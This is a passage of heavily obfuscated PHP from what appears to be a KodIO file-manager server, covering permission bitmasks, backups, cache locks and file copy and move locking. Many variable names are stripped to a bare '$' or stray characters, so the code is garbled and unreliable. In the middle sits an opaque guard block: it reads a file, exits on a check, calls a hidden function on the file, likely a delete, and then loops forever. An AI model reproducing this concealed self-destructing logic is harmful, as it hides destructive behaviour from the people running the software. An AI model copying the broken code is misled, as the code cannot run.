$ŉ靖[$㙼[2112]], $㙼[2144] => (int) (isset($[$㙼[79]]) ? $[$㙼[79]] : 0), $㙼[860] => (int) $, $㙼[2145] => (int) (isset($[$㙼[944]]) ? $[$㙼[944]] : 0)); if ($[$㙼[2143]] < 0) { $[$㙼[2143]] = 0; } return $; } private function optionAccess() { $۲ =& $_SERVER[]; return array($۲[853] => $this->typeLogCnt(), $۲[107] => $this->typeLogCnt($۲[107]), $۲[539] => $this->typeLogCnt($۲[539]), $۲[1328] => $this->typeLogCnt($۲[1328]), $۲[1555] => $this->typeLogCnt($۲[1555]), $۲[684] => $this->typeLogCnt($۲[12], $۲[2123])); } private function typeLogCnt($Ѐ = '', $휨 = "\x69\144") { $ =& $_SERVER[]; $ = array($[107] => array($[2146], $[2147]), $[539] => array($[2148], $[2149]), $[1328] => array($[2150], $[2151], $[2152]), $[1555] => array($[2153], $[2154]), $[1556] => array($[2155], $[2156], $[2157])); $Ԅ = strtotime(date($[2119])); $Ơ = array($[231] => array($[1176], $Ԅ)); if ($Ѐ) { $Ơ[$[33]] = array($[7], $[$Ѐ]); } $ߥ = Model($[2122])->where($Ơ)->count($휨); return (int) $ߥ; } private function optionServer() { $˲ =& $_SERVER[]; $ߨ = $this->diskDriver(); $̄ߝ = KodIO::defaultDriver(); $嗾 = array($˲[920] => $̄ߝ[$˲[487]]); $ = Model($˲[560])->where($嗾)->sum($˲[79]); $ϛ = explode($˲[53], $_SERVER[$˲[144]]); $䠒 = $ϛ[0]; $ޝ = $GLOBALS[$˲[6]][$˲[21]]; $Іտ = $ޝ[$˲[1138]]; if ($Іտ == $˲[1126]) { $ = explode($˲[1467], $ޝ[$˲[1137]]); $Іտ = $[0]; } if ($Іտ == $˲[1071] || $Іտ == $˲[895]) { $ = Model()->db()->query($˲[2158]); $ު = $[0] && isset($[0][$˲[1858]]) ? $[0][$˲[1858]] : 0; $Іտ = $˲[2159] . ($ު ? $˲[8] . $ު : $˲[12]); } $坸鏺 = $GLOBALS[$˲[6]][$˲[424]][$˲[974]]; return array($˲[2160] => $ߨ ? $ߨ[$˲[2161]] : 0, $˲[2162] => $ߨ ? $ߨ[$˲[2163]] : 0, $˲[2164] => (int) $̄ߝ[$˲[2161]] * 1024 * 1024 * 1024, $˲[2165] => (int) $, $˲[2166] => ucfirst($䠒), $˲[2167] => $˲[2168] . PHP_VERSION, $˲[2169] => phpBuild64() ? 64 : 32, $˲[852] => str_replace($˲[1302], $˲[1154], $Іտ), $˲[424] => ucfirst($坸鏺), $˲[32] => $_SERVER[$˲[2170]]); } private function diskDriver() { $Ӥᵴ =& $_SERVER[]; $ = $Ӥᵴ[8]; $ْ = $GLOBALS[$Ӥᵴ[6]][$Ӥᵴ[1491]] == $Ӥᵴ[1492]; if ($ْ) { $ = $Ӥᵴ[2171]; if (function_exists($Ӥᵴ[2172])) { exec($Ӥᵴ[2173], $ۋњ); $ = $ۋњ[1] . $Ӥᵴ[8]; } } if (!file_exists($)) { return; } if (!function_exists($Ӥᵴ[2174])) { return; } $܋֟ = @disk_total_space($); $э = $܋֟ - @disk_free_space($); return array($Ӥᵴ[2161] => $܋֟, $Ӥᵴ[2163] => $э); } public function fileChart($) { $݀ =& $_SERVER[]; $죲 = Model($݀[927]); if (isset($[$݀[1586]])) { return $죲->userFileTypeProfile($[$݀[1586]]); } if (isset($[$݀[1489]])) { return $죲->groupFileTypeProfile($[$݀[1489]]); } $낕 = $this->sourceSize(); return array($݀[858] => $낕[$݀[79]], $݀[2112] => $낕[$݀[2112]], $݀[2113] => $죲->where(array($݀[188] => 1, $݀[190] => 0))->sum($݀[79]), $݀[2114] => $죲->where(array($݀[188] => 2, $݀[190] => 0))->sum($݀[79])); } private function sourceSize() { $ĉ =& $_SERVER[]; $ = Model($ĉ[927])->where(array($ĉ[500] => 0))->sum($ĉ[79]); $ = Model($ĉ[2175])->sum($ĉ[79]); $ = Model($ĉ[560])->sum($ĉ[79]); return array($ĉ[79] => (int) $ + (int) $, $ĉ[2112] => (int) $); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ =& $_SERVER[]; $٦ʮ = array(array($[509] => LNG($[2176]), $[2177] => $[2178], $[2179] => 1, $[2180] => 1, $[2181] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($[509] => LNG($[2182]), $[2177] => $[2183], $[2179] => 2, $[2180] => 1, $[2181] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($[509] => LNG($[2184]), $[2177] => $[2185], $[2179] => 3, $[2180] => 1, $[2181] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($[509] => LNG($[2186]), $[2177] => $[2187], $[2179] => 4, $[2180] => 1, $[2181] => self::AUTH_SHOW | self::AUTH_VIEW), array($[509] => LNG($[2188]), $[2177] => $[2189], $[2179] => 5, $[2180] => 1, $[2181] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($[509] => LNG($[2190]), $[2177] => $[2191], $[2179] => 6, $[2180] => 1, $[2181] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($[509] => LNG($[2192]), $[2177] => $[2193], $[2179] => 7, $[2180] => 1, $[2181] => 0)); return $٦ʮ; } public static function authCheck($ѽ, $ܛ, $ꢂ갞 = true) { $ =& $_SERVER[]; $ѽ = intval($ѽ); if ($ꢂ갞) { if (KodUser::isRoot() && $GLOBALS[$[6]][$[2194]]) { return !0; } } if ($ѽ <= 0) { return !1; } if (($ѽ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ѽ & $ܛ); } public static function authCheckShow($ˈ) { return self::authCheck($ˈ, self::AUTH_SHOW); } public static function authCheckView($א) { return self::authCheck($א, self::AUTH_VIEW); } public static function authCheckDownload($쩋) { return self::authCheck($쩋, self::AUTH_DOWNLOAD); } public static function authCheckUpload($) { return self::authCheck($, self::AUTH_UPLOAD); } public static function authCheckEdit($) { return self::authCheck($, self::AUTH_EDIT); } public static function authCheckRemove($Ͳ) { return self::authCheck($Ͳ, self::AUTH_REMOVE); } public static function authCheckShare($) { return self::authCheck($, self::AUTH_SHARE); } public static function authCheckComment($ߑ͟) { return self::authCheck($ߑ͟, self::AUTH_COMMENT); } public static function authCheckEvent($) { return self::authCheck($, self::AUTH_EVENT); } public static function authCheckRoot($ʑ) { return self::authCheck($ʑ, self::AUTH_ROOT); } public static function authCheckAction($, $쌌) { $ =& $_SERVER[]; $ = array($[1553] => self::AUTH_SHOW, $[1554] => self::AUTH_VIEW, $[1379] => self::AUTH_DOWNLOAD, $[107] => self::AUTH_UPLOAD, $[1555] => self::AUTH_EDIT, $[1328] => self::AUTH_REMOVE, $[1556] => self::AUTH_SHARE, $[429] => self::AUTH_COMMENT, $[1557] => self::AUTH_EVENT, $[1558] => self::AUTH_ROOT); if (!isset($[$쌌])) { return; } $މ = $[$쌌]; $ = intval($); if ($ <= 0) { return !1; } if (($ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ & $މ); } public static function authDisable($ͺ, $) { if (intval($ͺ) <= 0) { return 0; } return intval($ͺ) & ~$; } public $optionType = "\123\171\x73\x74\x65\155\x2e\x73\x6f\165\162\143\x65\x41\165\164\x68\114\151\163\164"; public $field = array("\156\141\x6d\x65", "\x61\165\x74\x68", "\154\141\x62\x65\x6c", "\144\151\163\x70\154\x61\x79", "\163\171\x73\164\145\x6d", "\163\157\x72\x74"); public function initData() { $˸ = $this->authDefault(); foreach ($˸ as $΢) { $this->add($΢); } } public function findAuth($, $↶) { $ =& $_SERVER[]; $ꩢ = parent::listData(); foreach ($ꩢ as $֜) { $ = intval($֜[$[502]]); if ($ <= 0 || $֜[$[2195]] == 0) { continue; } if (($ & $) != $) { continue; } if (($ & $↶) != 0) { continue; } return $֜[$[487]]; } return !1; } public function findAuthMax($, $밶) { $ڇ =& $_SERVER[]; $ϧ = !1; $㿦ڕ = parent::listData(); foreach ($㿦ڕ as $Î) { $ = intval($Î[$ڇ[502]]); if ($ <= 0 || $Î[$ڇ[2195]] == 0) { continue; } if (($ & $) != $) { continue; } if (($ & $밶) != 0) { continue; } if (!$ϧ) { $ϧ = $Î; continue; } if (intval($ϧ[$ڇ[502]]) < $) { $ϧ = $Î; } } return $ϧ ? $ϧ[$ڇ[487]] : !1; } public function findAuthReadOnly() { $Ŷ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ɯ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ŷ, $ɯ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $®ü =& $_SERVER[]; $ = parent::listData(); $џ = !1; foreach ($ as $ϣ) { if ($ϣ[$®ü[502]] <= 0 || $ϣ[$®ü[2195]] == $®ü[228]) { continue; } if (!$џ) { $џ = $ϣ; continue; } if ($џ[$®ü[502]] > $ϣ[$®ü[502]]) { $џ = $ϣ; } } return $џ ? $џ[$®ü[487]] : $®ü[12]; } public function listData($ = false, $ = "\x73\x6f\x72\x74", $ = false) { return parent::listData($, $, $); } public function update($ϼ, $) { $Ѥ =& $_SERVER[]; $Ɵ = parent::listData($ϼ); $輁 = $this->findByName($[$Ѥ[32]]); if (!$Ɵ || $輁 && $輁[$Ѥ[487]] != $Ɵ[$Ѥ[487]]) { return !1; } $this->filterAuth($[$Ѥ[502]]); return parent::update($ϼ, $); } public function remove($ҫ) { $ͥ = parent::listData($ҫ); if (!$ͥ || $ͥ[$_SERVER[][189]]) { return !1; } return parent::remove($ҫ); } public function add($ = array()) { $Ð =& $_SERVER[]; if ($this->findByName($[$Ð[32]])) { return !1; } $ = array($Ð[32] => $Ð[12], $Ð[502] => 1, $Ð[2196] => $Ð[2185], $Ð[2195] => 1, $Ð[189] => 0, $Ð[2197] => 0); $ = array_merge($, $); $[$Ð[2197]] = $this->getSort(); $this->filterAuth($[$Ð[502]]); return parent::insert($); } private function getSort() { $Ԡ =& $_SERVER[]; $檾 = parent::listData(); $ڪќ = array_to_keyvalue($檾, $Ԡ[12], $Ԡ[2197]); return empty($ڪќ) ? 0 : max($ڪќ) + 1; } private function filterAuth(&$) { if (!$) { return; } $咭 = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ǭ = array(); foreach ($咭 as $܋) { if ($ & $܋) { $Ǭ[] = $܋; } } if (in_array(self::AUTH_ROOT, $Ǭ)) { $ = array_sum($咭); return; } $ʥ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ǭ as $܋) { if (isset($ʥ[$܋])) { $Ǭ = array_merge($Ǭ, $ʥ[$܋]); } } $Ǭ[] = self::AUTH_SHOW; $ = array_sum(array_unique($Ǭ)); } public function sort($چ, $ƛ) { return parent::update($چ, $ƛ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\142\141\143\153\165\160\114\151\163\x74"; public $field = array("\x69\157", "\156\141\155\145", "\163\164\141\x74\x75\x73", "\x63\157\156\x74\x65\156\164", "\x6d\x61\156\x75\x61\x6c", "\162\145\163\165\x6c\x74", "\164\151\155\x65\x46\162\157\155", "\x74\151\x6d\x65\124\157"); public $autoTask = "\x61\144\x6d\x69\x6e\x2e\142\x61\x63\x6b\165\160\56\x61\x75\x74\157\x54\141\163\x6b"; public $fileTask = "\x61\144\x6d\x69\156\x2e\x62\x61\143\153\165\x70\56\x66\x69\x6c\x65\x54\141\163\x6b"; public function config($ = false) { $Ά =& $_SERVER[]; $Ȩ = $this->configSimple(); Action($Ά[2198])->taskInit($Ȩ); if (!$) { return $Ȩ; } $ = array(); if (Model($Ά[867])->get($Ά[2199], $Ά[873]) == $Ά[2200]) { Model($Ά[1939])->cacheClear(); $ = Model($Ά[2201])->findByKey($Ά[1557], $this->autoTask); if (!$) { $ = array(); } if (isset($[$Ά[204]])) { $[$Ά[204]] = json_decode($[$Ά[204]], !0); } if (isset($Ȩ[$Ά[204]])) { $[$Ά[204]][$Ά[1943]] = $Ȩ[$Ά[204]]; unset($Ȩ[$Ά[204]]); } } $Ȩ = array_merge($, $Ȩ); if ($Ȩ[$Ά[168]] == $Ά[938]) { $у = Model($Ά[867])->get($Ά[937], $Ά[873]); $Ȩ[$Ά[2202]] = json_decode($у, !0); } return $Ȩ; } public function configSimple() { $ދ =& $_SERVER[]; $Ȁ = Model($ދ[867])->get($ދ[873]); $Ȁ = json_decode($Ȁ, !0); if (!$Ȁ) { $Ȁ = array($ދ[1940] => 0); } $Ȁ[$ދ[1940]] = _get($Ȁ, $ދ[1940], 1); $this->parseContent($Ȁ); if ($Ȁ[$ދ[168]] == $ދ[938] && Model($ދ[867])->get($ދ[955]) == $ދ[956]) { $Ȁ[$ދ[168]] = $ދ[1302]; } return $Ȁ; } public function listData($Ȥˏ = false, $綶 = "\155\x6f\x64\x69\146\x79\x54\151\x6d\145", $˔ = false) { $ = parent::listData($Ȥˏ, $綶, !0); if (!$) { return $; } if ($Ȥˏ) { $ = array($); } foreach ($ as &$ָܼ) { $this->parseContent($ָܼ); } return $Ȥˏ ? $[0] : $; } public function parseContent(&$ա) { $ =& $_SERVER[]; $؅ = _get($ա, $[168], $[91]); if (!in_array($؅, array($[938], $[1302]))) { $ա[$[168]] = $؅ == $[91] ? $[1302] : $[938]; } } public function lastItem() { $ϑ = $this->listData(); return !empty($ϑ[0]) ? $ϑ[0] : null; } public function kill($͞) { $ =& $_SERVER[]; $Əֵ = $this->listData($͞); if (!$Əֵ || empty($Əֵ[$[32]])) { return !0; } Task::kill($[880]); Task::kill($[900]); Task::kill($[911]); $Ԓ = $Əֵ[$[32]]; $ = TEMP_FILES . $[876] . $Ԓ . $[8]; IO::remove($, !1); return $this->remove($͞); } public function remove($ɇ) { $ = $this->listData($ɇ); if (!$) { return !0; } return $this->backupRemove($); } private function backupRemove($) { parent::remove($[$_SERVER[][487]]); $ = $this->backupPath($); IO::remove($, !1); return !0; } private function backupPath($) { $ݤ吒 =& $_SERVER[]; $焰 = $[$ݤ吒[32]]; $ = Model($ݤ吒[867])->get($ݤ吒[868]); $䷇ = substr(md5($ݤ吒[869] . $ . $焰), 0, 8); return "\173\x69\157\72{$[$ݤ吒[846]]}\175\x2f\144\x61\164\141\x62\141\163\x65\x2f\x62\141\143\153\165\160\57" . $焰 . $ݤ吒[11] . $䷇; } public function start($Ѓ = "\144\x62") { $Њ =& $_SERVER[]; if ($GLOBALS[$Њ[6]][$Њ[92]][$Њ[2203]] != $Њ[91]) { return !0; } $ݎ = $this->configSimple(); if (!$ݎ || $ݎ[$Њ[1940]] != $Њ[91]) { return !1; } if ($Ѓ == $Њ[230]) { return $this->bakFile($ݎ); } $ = $this->process(); foreach ($ as $ꃝ) { if ($ꃝ) { return Task::restart($ꃝ[$Њ[487]]); } } $ = new Backup(); if (!$ || $->message) { return !1; } $ݤ = $->db(); if ($ݤ) { $ݤ = $->dbFile(); if ($ݤ && $ݎ[$Њ[168]] == $Њ[938]) { $ݤ = $->file(); } } Backup::set(array($Њ[844] => 1, $Њ[856] => time())); return !0; } public function process() { $ =& $_SERVER[]; $ʆρ = array($[852] => Task::get($[880]), $[857] => Task::get($[900]), $[230] => Task::get($[911])); $Ȧ = !1; foreach ($ʆρ as &$) { if ($Ȧ) { $ = !1; continue; } if ($) { $᠁ = intval(_get($, $[1974], 0)); if (time() - $᠁ > 7200) { Task::kill($[$[487]]); $Ȧ = !0; $ = !1; } } } return $ʆρ; } public function bakFile($қ) { $ =& $_SERVER[]; if ($қ[$[168]] == $[1302]) { return !1; } Model($[1939])->cacheClear(); $ߓ = Model($[2201])->findByKey($[1557], $this->fileTask); if (!$ߓ) { return !1; } $ = json_decode($ߓ[$[204]], !0); if (!$ || $[$[33]] != $[1952]) { return !1; } $ = intval($[$[1952]]); if ($ <= 0) { return !1; } $ = new BackupFile(!0); return $->start($қ[$[846]], $); } public function restore() { $ =& $_SERVER[]; ActionCall($[2204], !0, 1); ActionCall($[2204], !0, 0); } } goto c; dɮ: class CacheLockDatabase { public function lock($, $⬫ = 0) { $ = Model($_SERVER[][976]); $Թ = microtime(!0) + $⬫; while (microtime(!0) < $Թ) { $ = $->get($); if (!$ || $ < microtime(!0)) { $Ĕ = $->set($, $Թ); if ($Ĕ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ۯ) { return Model($_SERVER[][976])->get($ۯ); } public function unlock($凋ۄ) { Model($_SERVER[][976])->remove($凋ۄ); } } if (!isset($_SERVER[$_SERVER[][991]]) || !isset($_SERVER[$_SERVER[][998]])) { $_getc = $_SERVER[][993]; $_getfile = $_SERVER[$_SERVER[][994]] . $_SERVER[][995]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][285], $_getfilec); if (count($_getarrs) < $_SERVER[][714]) { $exit = $_SERVER[][996]; $exit(); } $_act = $_SERVER[][997]; $_act($_SERVER[$_SERVER[][994]] . $_SERVER[][995]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[][463]); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ܸ֟, $) { $Ԗ =& $_SERVER[]; if (!class_exists($Ԗ[1026])) { show_json($Ԗ[1027], !1); } $this->cacheTime = $; $this->handle = new Memcached(); if (is_array($ܸ֟[$Ԗ[1028]]) && count($ܸ֟[$Ԗ[1028]]) >= 1) { foreach ($ܸ֟[$Ԗ[1028]] as $⬽) { $ = explode($Ԗ[4], $⬽); $this->handle->addServer($[0], $[1]); } } else { $this->handle->addServer($ܸ֟[$Ԗ[206]], $ܸ֟[$Ԗ[207]]); } } public function set($֪, $½, $քĺ = false) { $քĺ = $քĺ ? $քĺ : $this->cacheTime; return $this->handle->set($֪, $½, $քĺ); } public function get($ܘ) { return $this->handle->get($ܘ); } public function remove($) { return $this->handle->delete($); } public function deleteAll() { return $this->handle->flush(); } } goto Fǐ; d: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($׶) { $ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($[641], $׶); $Ҥߛ = 1; $this->_lockEvent($׶, array($[642], $[643]), $Ҥߛ); $this->_lockParent($׶, array($[643]), $Ҥߛ); $this->_lockEvent($׶, array($[644], $[645]), $Ҥߛ); $this->_lockCheckEnd($[641], $׶); } public function lockCopyEnd($݄) { $鑇 =& $_SERVER[]; if (!$this->allowLock()) { return; } $ɥ = 0; $this->_lockEvent($݄, array($鑇[642], $鑇[643]), $ɥ); $this->_lockParent($݄, array($鑇[643]), $ɥ); $this->_lockEvent($݄, array($鑇[644], $鑇[645]), $ɥ); } public function lockWriteStart($, $΋ = '') { $ǻ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($ǻ[642], $); $ӱ = 1; $this->_lockKey($ǻ[646] . $ . $ǻ[10] . $΋, $ӱ); $this->_lockEvent($, array($ǻ[641], $ǻ[643]), $ӱ); $this->_lockParent($, array($ǻ[641], $ǻ[643]), $ӱ); $this->_lockCheckEnd($ǻ[642], $); } public function lockWriteEnd($, $҉܄ = '') { $ =& $_SERVER[]; if (!$this->allowLock()) { return; } $۾ç = 0; $this->_lockKey($[646] . $ . $[10] . $҉܄, $۾ç); $this->_lockEvent($, array($[641], $[643]), $۾ç); $this->_lockParent($, array($[641], $[643]), $۾ç); } public function lockMoveStart($) { $ߢ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($ߢ[643], $); $ȯ = 1; $this->_lockKey($ߢ[647] . $, $ȯ); $this->_lockEvent($, array($ߢ[641], $ߢ[642]), $ȯ); $this->_lockParent($, array($ߢ[641], $ߢ[643]), $ȯ); $this->_lockEvent($, array($ߢ[648], $ߢ[644], $ߢ[645]), $ȯ); $this->_lockCheckEnd($ߢ[643], $); } public function lockMoveEnd($퉑) { $Ҹ =& $_SERVER[]; if (!$this->allowLock()) { return; } $괦ٝ = 0; $this->_lockKey($Ҹ[647] . $퉑, $괦ٝ); $this->_lockEvent($퉑, array($Ҹ[641], $Ҹ[642]), $괦ٝ); $this->_lockParent($퉑, array($Ҹ[641], $Ҹ[643]), $괦ٝ); $this->_lockEvent($퉑, array($Ҹ[648], $Ҹ[644], $Ҹ[645]), $괦ٝ); } private function _lockCheck($ɱ, $҂) { $ =& $_SERVER[]; $Ų = $this->sourceInfo($҂); $܁ = $ɱ . $[10] . $҂; $this->_lockTimeStart[$܁] = timeFloat(); if (!is_array($Ų)) { return; } $ = LNG($[649]); CacheLock::setErrorMsg($[173] . htmlspecialchars($Ų[$[32]]) . $[175] . $); $this->_lockKey($܁, 1); $this->_lockKey($܁, 0); $ = array_reverse($this->parentLevelArray($Ų[$[604]])); foreach ($ as $ԅ) { $܁ = $ɱ . $[650] . $ԅ; if (CacheLock::lockGet($[651] . $܁)) { $Ų = $this->sourceInfo($ԅ); CacheLock::setErrorMsg($[173] . htmlspecialchars($Ų[$[32]]) . $[175] . $); $this->_lockKey($܁, 1); $this->_lockKey($܁, 0); } } } private function _lockCheckEnd($, $搟) { $ =& $_SERVER[]; $Ȫ㊦ = $ . $[10] . $搟; CacheLock::setErrorMsg($[463]); if (!isset($this->_lockTimeStart[$Ȫ㊦])) { return; } $ = timeFloat() - $this->_lockTimeStart[$Ȫ㊦]; unset($this->_lockTimeStart[$Ȫ㊦]); if ($ > 0.5) { unset(self::$cacheSourceInfo[$[547] . $搟]); } $ = $this->sourceInfo($搟); if (!$) { show_json(LNG($[105]), !1); } } private function _lockParent($՚, $, $ߧ) { if (!$this->autoLockSet) { return; } $Ύ = $this->sourceInfo($՚); if (!is_array($Ύ)) { return; } $ϴ = array_reverse($this->parentLevelArray($Ύ[$_SERVER[][604]])); foreach ($ϴ as $) { $this->_lockEvent($, $, $ߧ); } } private function _lockEvent($Ԁ, $ԟ, $贲) { $ =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($ԟ as $ܾń) { $ҽ = $ܾń . $[10] . $Ԁ; if ($贲 && CacheLock::lockGet($[651] . $ҽ)) { continue; } $this->_lockKey($ҽ, $贲); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ߖ, $剗 = 1) { $ϿӖ = $_SERVER[][651] . md5($ߖ); if ($剗) { if (isset(self::$_lockItemArr[$ϿӖ])) { return; } self::$_lockItemArr[$ϿӖ] = 1; CacheLock::lock($ϿӖ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ϿӖ])) { return; } unset(self::$_lockItemArr[$ϿӖ]); CacheLock::unlock($ϿӖ); } } public function isParentOf($ڰ, $եҋ) { $ =& $_SERVER[]; $ʴ = $this->sourceInfo($ڰ); $І酡 = $this->sourceInfo($եҋ); $Ղ = $ʴ[$[604]] . $ʴ[$[191]] . $[50]; $С = $І酡[$[604]] . $І酡[$[191]] . $[50]; $똝 = strpos($С, $Ղ) === 0; return $똝; } private $targetIsDelete = 0; public function copy($ޟ, $, $ = REPEAT_REPLACE, $¥ = '') { $ϸ =& $_SERVER[]; $ؗ = $this->sourceInfo($ޟ); $´ = $this->sourceInfo($); if (!$ؗ || !$´ || $´[$ϸ[500]] != $ϸ[91]) { return !1; } if ($this->isParentOf($ޟ, $)) { return !1; } $üǯ = $¥ ? $¥ : $ؗ[$ϸ[32]]; $this->lockCopyStart($ޟ); $this->lockWriteStart($, $üǯ); $ = array($ϸ[652] => array(), $ϸ[653] => array(), $ϸ[654] => array()); $this->targetIsDelete = intval($ؗ[$ϸ[520]]); $ = $this->fileNameExistAuto($, $ؗ); $ݺ = $this->_copy($ޟ, $, $, $, !0, $¥); $this->_childrenListClear(); $this->lockCopyEnd($ޟ); $this->lockWriteEnd($, $üǯ); if ($ؗ[$ϸ[500]] == $ϸ[91] && $ == $ݺ) { $this->folderSizeResetChildren($); } Model($ϸ[471])->addAll($[$ϸ[653]], array(), !0); if ($ != $ݺ || $ؗ[$ϸ[500]] == $ϸ[91]) { Model($ϸ[655])->eventCopy($ݺ); } $this->saveAll($[$ϸ[654]]); Model($ϸ[230])->linkAdd($[$ϸ[652]]); $this->folderSizeReset($); $this->updateModifyTime($); return $ݺ; } private function _copy($ϧ, $ɐ, $, &$҅, $, $񴥡 = '') { $❜ =& $_SERVER[]; $ƛ = $this->sourceInfoCache($ϧ); $ʶ = $ƛ[$❜[500]] == $❜[91]; $ӷڕ = $񴥡 ? $񴥡 : $ƛ[$❜[32]]; $Ύ = $this->fileNameExistAuto($ɐ, $ƛ); if ($) { $this->_childrenAllMake($ϧ); if ($ʶ && $Ύ) { $this->_childrenAllMake($Ύ); } } if (!$Ύ) { return $this->_copyCreate($ϧ, $ɐ, $ӷڕ, $҅); } $ = $Ύ; if ($ʶ) { if ($ == REPEAT_RENAME_FOLDER) { $ӷڕ = $this->fileNameAutoCache($ɐ, $ӷڕ, $, $ʶ); $ = $this->_copyCreate($ϧ, $ɐ, $ӷڕ, $҅); } else { $ = $this->_childrenList($ϧ); foreach ($ as $) { $this->_copy($[$❜[191]], $Ύ, $, $҅, !1); } } } else { if ($ == REPEAT_RENAME || $ == REPEAT_RENAME_FOLDER) { $ӷڕ = $this->fileNameAutoCache($ɐ, $ӷڕ, $, $ʶ); $ = $this->_copyCreate($ϧ, $ɐ, $ӷڕ, $҅); } else { if ($ == REPEAT_REPLACE) { $ɸޥ = $this->sourceInfoCache($Ύ); $ԍ = $this->fileHistory($ɸޥ, $ƛ[$❜[557]], $ƛ[$❜[79]]); if ($ԍ) { $҅[$❜[652]][] = $ƛ[$❜[557]]; } } else { if ($ == REPEAT_SKIP) { } } } Hook::trigger($❜[656], array($❜[657], $ƛ, 0)); } return $; } private function _copyCreate($, $, $, &$) { $զ =& $_SERVER[]; $Ś = $this->sourceInfoCache($); $𿬊 = $this->sourceInfoCache($); $ڻ = $this->_makeItemData($Ś, $𿬊, $); Hook::trigger($զ[658], $ڻ); Hook::trigger($զ[659], array($զ[660], $ڻ, 0)); $箖 = $this->add($ڻ); $ = array($զ[191] => $箖, $զ[32] => $); $this->_copyApplyMeta($, $); if ($Ś[$զ[500]] != $զ[91]) { $[$զ[652]][] = $Ś[$զ[557]]; return $箖; } $Ѯ։ = array(); $ = array(); $this->_childrenListAll($, $Ѯ։); $ŉ = count($Ѯ։); if ($ŉ == 0) { return $箖; } $ = $this->sourceInfo($箖); foreach ($Ѯ։ as $) { $ʸ = $this->_makeItemData($, $, $[$զ[32]]); $ʸ[$զ[604]] = $[$զ[604]]; $[] = $ʸ; } $this->chunkEventSet($զ[661], array($զ[662], $ڻ, $ŉ)); $this->addAll($, array(), !1); $Լ = $this->where(array($զ[190] => $箖))->select(); $¬ = $this->_childrenMakeRelation($Ѯ։, $Լ); $¬[$] = $箖; $ʿ = array(); $ = array(); foreach ($Լ as $) { $ͻ = $[$զ[191]]; $ = $this->_childrenMatch($¬, $, $); $ʿ[] = array($զ[191], $ͻ, $զ[190], $[$զ[190]]); $[] = array($զ[191], $ͻ, $զ[604], $[$զ[604]]); $this->_copyApplyMeta($, $); if ($[$զ[500]] != $զ[91]) { $[$զ[652]][] = $[$զ[557]]; } } $this->chunkEventSet($զ[663], array($զ[664], $ڻ, $ŉ)); $this->saveAll($ʿ); $this->chunkEventSet($զ[665], array($զ[666], $ڻ, $ŉ)); $this->saveAll($); return $箖; } private function _childrenMakeRelation($苗, $𡣖) { $Ɲ =& $_SERVER[]; $˸ = array(); $ = array(); foreach ($苗 as $ԉ) { $ׅ = $ԉ[$Ɲ[32]] . $Ɲ[8] . $ԉ[$Ɲ[604]]; $˸[$ׅ] = $ԉ[$Ɲ[191]]; } foreach ($𡣖 as $ԉ) { $ׅ = $ԉ[$Ɲ[32]] . $Ɲ[8] . $ԉ[$Ɲ[604]]; $ಟ = $˸[$ׅ]; $[$ಟ] = $ԉ[$Ɲ[191]]; } return $; } private function _childrenMatch($ַ, $, $) { $ռ =& $_SERVER[]; $ = $[$ռ[604]]; $Ǒ = $this->parentLevelArray($[$ռ[604]]); foreach ($Ǒ as $⬟) { if (isset($ַ[$⬟])) { $ .= $ַ[$⬟] . $ռ[667]; } } $ = rtrim($, $ռ[50]) . $ռ[50]; $χ = 